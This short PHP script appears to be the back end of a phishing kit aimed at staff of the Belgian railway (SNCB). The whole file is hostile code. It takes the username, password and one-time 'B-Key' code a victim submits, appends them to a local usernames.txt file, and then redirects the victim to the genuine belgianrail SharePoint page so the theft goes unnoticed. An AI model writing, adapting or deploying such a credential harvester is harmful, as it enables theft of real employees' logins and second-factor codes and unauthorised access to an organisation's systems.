<?php

file_put_contents("usernames.txt", "sncb Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password']  . " B-Key: " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://belgianrail.sharepoint.com/sites/WeBe/SitePages/Accueil.aspx');
exit();
?>
